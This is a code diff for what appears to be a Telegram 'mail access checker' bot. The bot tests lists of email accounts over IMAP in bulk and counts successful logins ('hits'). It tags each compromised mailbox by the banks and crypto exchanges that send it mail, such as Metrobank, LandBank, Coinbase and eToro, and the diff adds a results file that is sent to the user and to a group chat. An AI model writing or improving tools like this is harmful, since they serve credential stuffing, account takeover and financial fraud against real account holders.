@@ -273,7 +273,7 @@ class UnifiedChecker:
             'metrobank.com.ph': 'Metrobank',
             'landbank.com': 'LandBank',
             'securitybank.com': 'Security Bank',
-            'coinbase.com': 'Coinbase',
+            'no-reply@coinbase.com': 'Coinbase',
             'etoro.com': 'eToro',
         }
 
@@ -1300,7 +1300,7 @@ class BotApp:
             if sess.is_imap:
                 # status for "Another" mode
                 types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
-                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
                 msg = (
                     f"Q bot mail access checker{vip_tag}\n"
                     f"hits : {sess.hits}\n"
@@ -1312,7 +1312,7 @@ class BotApp:
                 )
             else:
                 countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
-                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
                 msg = (
                     f"Q bot mail access checker{vip_tag}\n"
                     f"hits : {sess.hits}\n"
@@ -1496,17 +1496,16 @@ class BotApp:
 
         ex = ThreadPoolExecutor(max_workers=(30 if is_vip else 12))
         fs = [ex.submit(worker, acc) for acc in accounts]
-        for f in fs:
-            if sess.stop_ev.is_set():
-                try: ex.shutdown(wait=False, cancel_futures=True)
-                except: pass
-                break
-            try:
-                f.result(timeout=60)
-            except:
-                pass
-        try: ex.shutdown(wait=False, cancel_futures=True)
-        except: pass
+        try:
+            pending = set(fs)
+            while pending and not sess.stop_ev.is_set():
+                done = {f for f in list(pending) if f.done()}
+                pending -= done
+                self._send_status(sess, chat_id)  # keep UI fresh
+                time.sleep(0.5)
+        finally:
+            try: ex.shutdown(wait=False, cancel_futures=True)
+            except: pass
         self.finish(chat_id)
 
     def finish(self, chat_id):
@@ -1517,6 +1516,21 @@ class BotApp:
         # flush remaining batch
         self._flush_batch(sess, chat_id)
         try:
+            # send full services counts file
+            if sess.service_counts:
+                sc_sorted = sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))
+                sc_name = f"services_counts_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
+                sc_path = os.path.join(os.getcwd(), sc_name)
+                with open(sc_path, "w", encoding="utf-8") as f:
+                    for k, v in sc_sorted:
+                        f.write(f"{k}:{v} | BY : @T_Q_mailbot\n")
+                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
+                user_tag = sess.username or str(chat_id)
+                send_document(chat_id, sc_path, caption=f"services_counts ({len(sc_sorted)})")
+                try: send_document(GROUP_ID, sc_path, caption=f"{user_tag}{vip_tag} | services_counts ({len(sc_sorted)})")
+                except: pass
+                try: os.remove(sc_path)
+                except: pass
             if sess.country_results:
                 for c, lines in sess.country_results.items():
                     if not lines:
